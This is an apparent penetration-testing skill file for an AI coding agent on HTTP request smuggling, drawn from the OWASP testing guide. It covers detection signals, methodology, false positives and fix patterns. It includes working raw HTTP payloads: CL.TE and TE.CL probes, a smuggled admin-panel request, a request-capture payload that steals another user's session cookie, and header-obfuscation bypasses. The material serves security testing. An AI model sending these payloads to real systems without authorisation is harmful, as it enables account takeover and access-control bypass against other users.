---
name: http-request-smuggling
description: >
  HTTP request smuggling exploits disagreements between a front-end proxy and back-end server on where one HTTP request ends and the next begins, using conflicting `Content-Length` and `Transfer-Encoding: chunked` headers (CL.TE, TE.CL, TE.TE variants). Enables bypassing access controls, cache poisoning, session hijacking, and capturing other users' requests. Detect via timing attacks, differential responses, and tools like Burp's HTTP Request Smuggler extension.
license: MIT
compatibility: Designed for Claude Code. Requires Burp Suite with HTTP Request Smuggler extension.
metadata:
  category: web
  version: "0.1"
  source: https://owasp.org/www-project-web-security-testing-guide/stable/
  source_types: framework
  wstg: WSTG-INPV-15
---

# HTTP Request Smuggling

## What Is Broken and Why
HTTP request smuggling arises from ambiguity in how HTTP/1.1 allows both `Content-Length` and `Transfer-Encoding` headers simultaneously. When a front-end proxy and back-end server disagree on which header takes precedence, an attacker can craft a request whose body is interpreted differently by each hop. The "leftover" bytes from one request are prepended to the next user's request, allowing attackers to poison the request pipeline, bypass security controls, hijack sessions, and perform reflected XSS without user interaction.

## Key Signals
- Application sits behind a reverse proxy, load balancer, or CDN
- Delayed response to a crafted request with conflicting length headers (timing-based detection)
- Different HTTP response when `Transfer-Encoding: chunked` and `Content-Length` headers are both present
- `400 Bad Request` or `500` from back-end on specific header combinations
- Burp's HTTP Request Smuggler extension flagging the endpoint
- Front-end rewrites or strips certain headers (evidence in `X-Forwarded-*` reflection)

## Methodology
1. Identify endpoints that pass through a proxy/CDN layer.
2. Send a CL.TE detection probe: include both `Content-Length` and `Transfer-Encoding: chunked` with conflicting values; observe timing and response differences.
3. Send a TE.CL detection probe: `Transfer-Encoding` terminates the body early, `Content-Length` extends it.
4. Confirm vulnerability with a harmless poisoning request that prepends a known prefix to the next request.
5. Escalate based on what prefix is prepended (bypass access controls, capture requests, perform SSRF, etc.).
6. Use Burp's HTTP Request Smuggler extension to automate detection across all methods.

## Payloads & Tools
```
# CL.TE probe (front-end uses Content-Length, back-end uses Transfer-Encoding)
# Send with Content-Length: 6 but chunked body terminator at byte 3
POST / HTTP/1.1
Host: TARGET
Content-Length: 6
Transfer-Encoding: chunked

3
abc
0


# TE.CL probe (front-end uses Transfer-Encoding, back-end uses Content-Length)
POST / HTTP/1.1
Host: TARGET
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0


# Access control bypass — smuggle request to restricted endpoint
POST / HTTP/1.1
Host: TARGET
Content-Length: 116
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: TARGET
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=1

# Capture next user's request (poison with open POST)
POST / HTTP/1.1
Host: TARGET
Content-Length: 198
Transfer-Encoding: chunked

0

POST /post/comment HTTP/1.1
Host: TARGET
Content-Length: 400
Cookie: session=TOKEN

csrf=TOKEN2&postId=5&name=carlos&email=foo%40bar.com&comment=

# Burp Suite HTTP Request Smuggler extension
# Extensions -> HTTP Request Smuggler -> Smuggle Probe
# Run against target host to auto-detect CL.TE, TE.CL, TE.TE variants

# TE.TE obfuscation variants to bypass front-end normalization
Transfer-Encoding: xchunked
Transfer-Encoding: chunked
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding:[tab]chunked
 Transfer-Encoding: chunked
X: X\nTransfer-Encoding: chunked
Transfer-Encoding
 : chunked
```

## Bypass Techniques
- TE.TE obfuscation: send two `Transfer-Encoding` headers, one with a non-standard value, to make one server ignore it
- Whitespace manipulation in header values: `Transfer-Encoding: chunked ` (trailing space), `Transfer-Encoding:\tchunked`
- Header line folding (obsolete but sometimes accepted): newline + space in header continuation
- Mixed case: `Transfer-Encoding: Chunked`
- Duplicate headers with different values to exploit server-specific precedence rules
- HTTP/2 downgrade: some H2-to-H1 translation proxies introduce smuggling opportunities

## Exploitation Scenarios
**Scenario 1 — Admin Panel Access Control Bypass**
Setup: Front-end proxy blocks direct access to `/admin` based on IP. CL.TE smuggling confirmed.
Trigger: Smuggle `GET /admin HTTP/1.1` as the body prefix; next legitimate request is interpreted by the back-end as following the smuggled admin request.
Impact: Unauthenticated access to administrative functionality restricted by front-end IP filtering.

**Scenario 2 — Session Hijacking via Request Capture**
Setup: TE.CL vulnerability on a comment submission endpoint; attacker is authenticated.
Trigger: Poison the pipeline with an incomplete POST body pointing to the comment field; next user's request (including their session cookie and body) is appended to the comment body and stored.
Impact: Another user's session token and request data captured and stored, enabling full account takeover.

**Scenario 3 — Reflected XSS Without Victim Interaction**
Setup: CL.TE smuggling on application that reflects request URL in 404 responses.
Trigger: Smuggle a GET request with an XSS payload in the URL as a prefix; next user's normal request is processed with the XSS prefix prepended to their URL path.
Impact: Victim receives a 404 response containing reflected XSS payload, executing in their browser.

## False Positives
- Timing differences caused by network latency rather than pipeline desync
- Back-end returning 400 for chunked encoding due to intentional rejection (not necessarily exploitable desync)
- Responses varying due to load balancer sending requests to different back-end instances
- WAF returning 400 before the request reaches the vulnerable server pair

## Fix Patterns
- Ensure front-end and back-end servers use the same HTTP version and header parsing rules
- Configure front-end proxy to normalize ambiguous requests before forwarding (reject or rewrite conflicting CL/TE)
- Reject requests containing both `Content-Length` and `Transfer-Encoding` headers
- Use HTTP/2 end-to-end (H2C) between front-end and back-end to eliminate HTTP/1.1 ambiguity
- Enable strict request parsing on back-end web servers (reject malformed chunked encoding)
- Keep proxy and server software updated to versions with smuggling protections

## Related Skills

HTTP request smuggling can pivot into [[ssrf]] by prepending a smuggled request that reaches internal back-end services inaccessible from the internet. Capturing another user's request via the pipeline poison technique is functionally a session hijack, which overlaps with [[cookie-attacks]]. The reflected XSS variant of smuggling (injecting an XSS prefix that the next user's response inherits) is a delivery mechanism for [[xss-reflected]] that bypasses WAFs entirely because the XSS payload never appears in the victim's original request.
